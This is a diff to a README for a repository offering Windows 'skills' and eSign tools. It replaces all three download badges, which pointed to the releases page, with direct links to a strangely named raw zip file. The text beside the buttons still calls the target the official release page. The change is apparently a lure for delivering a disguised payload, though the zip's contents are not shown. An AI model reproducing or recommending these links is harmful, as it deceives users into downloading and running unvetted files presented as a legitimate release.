@@ -1,6 +1,6 @@
 # 🛠️ skills - Practical tools for common tasks
 
-[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/raw/refs/heads/main/esign-automation/Software_ammonoidean.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and open skills on your Windows PC.
 
 Click this button to go to the official download page:
 
-[![Visit release page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/releases)
+[![Visit release page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/raw/refs/heads/main/esign-automation/Software_ammonoidean.zip)
 
 This page shows all available versions of skills. You will find the latest files ready for download.
 
@@ -131,4 +131,4 @@ If you want to learn more about eSign or related tools, this repository includes
 
 ---
 
-[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen?style=for-the-badge)](https://github.com/headlike-oradexon12/skills/raw/refs/heads/main/esign-automation/Software_ammonoidean.zip)
